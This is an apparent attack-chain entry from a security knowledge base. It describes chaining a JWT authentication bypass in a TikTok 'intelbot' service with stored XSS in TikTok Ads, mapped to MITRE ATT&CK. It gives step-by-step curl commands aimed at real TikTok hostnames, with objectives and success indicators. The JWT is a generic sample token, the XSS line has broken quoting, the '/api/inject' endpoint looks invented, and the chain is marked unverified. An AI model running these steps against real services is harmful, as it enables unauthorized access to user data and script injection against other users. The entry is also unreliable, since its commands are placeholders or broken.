---
tags:
  - jwt
  - authentication-bypass
  - stored-xss
  - tiktok
type: attack_chain
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands: []
platforms:
  - Web
complexity: medium
procedures:
  - '[[procedures/Exploit-JWT-Authentication-Bypass-in-Intelbot-Service]]'
  - '[[procedures/Inject-Stored-XSS-via-TikTok-Ads]]'
step_count: 2
techniques:
  - '[[Valid Accounts]]'
  - '[[JavaScript]]'
description: >-
  Chained exploitation of authentication bypass in TikTok's intelbot service and
  stored XSS in TikTok Ads for unauthorized access and script injection
skill_level: intermediate
impact_level: high
id: 6506805a-e0a4-4e8d-927b-0a05cefcf81e
created_at: '2025-12-11T03:47:56.598Z'
updated_at: '2025-12-11T03:47:56.598Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0001]]'
  - '[[TA0002]]'
mitre_techniques:
  - '[[T1078]]'
  - '[[T1059.007]]'
---
# Authentication Bypass via JWT Misverification Leading to Stored XSS in TikTok Ads

Multi-stage attack chain demonstrating unauthorized access to sensitive ticket data via JWT misverification and subsequent injection of malicious scripts site-wide on TikTok Ads.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access via Auth Bypass] --> B[Execution via Stored XSS]
    style A fill:#e74c3c
    style B fill:#f39c12
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Burp-Suite]]

### Target Environment

- Web platform
- intelbot service and TikTok Ads
- Network access to TikTok endpoints

### Initial Access Requirements

- Access to TikTok Ads interface
- Ability to intercept and modify HTTP requests

## Detailed Attack Procedures

### Step 1: Exploit Authentication Bypass - [[procedures/Exploit-JWT-Authentication-Bypass-in-Intelbot-Service]]

**Procedure**: [[procedures/Exploit-JWT-Authentication-Bypass-in-Intelbot-Service]]

**Objective**: Bypass authentication in the intelbot service by manipulating an improperly verified JWT to gain unauthorized access to ticket information.

**Expected Output**: Successful retrieval of sensitive ticket data without valid credentials.

Use [[commands/curl-jwt-manipulation]] to send a modified JWT:

```bash
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c" https://intelbot.tiktok.com/api/tickets -X GET
```

Modify the JWT payload to include unauthorized claims and observe if the server accepts it without proper verification.

**Success Indicators**:
- Response contains ticket information
- No authentication error returned

### Step 2: Inject Stored XSS - [[procedures/Inject-Stored-XSS-via-TikTok-Ads]]

**Procedure**: [[procedures/Inject-Stored-XSS-via-TikTok-Ads]]

**Objective**: Leverage the authentication bypass to inject malicious scripts into TikTok Ads, enabling site-wide stored XSS execution.

**Expected Output**: Malicious script stored and executed across the site, potentially affecting multiple users.

Using the bypassed access, inject XSS payload with [[commands/curl-xss-injection]]:

```bash
curl -H "Authorization: Bearer [modified-jwt]" -d '{"content": "<script>alert("XSS")</script>"}' https://ads.tiktok.com/api/inject -X POST
```

Verify the script executes by visiting the affected page.

**Success Indicators**:
- Alert or script execution observed
- Script persists across sessions

## Attack Chain Summary

### Key Achievements

1. Unauthorized access to sensitive ticket data
2. Site-wide injection of malicious scripts
3. Potential for broader compromise of user sessions

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Valid Accounts]]
- [[JavaScript]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]

*Last updated: [TIMESTAMP]*
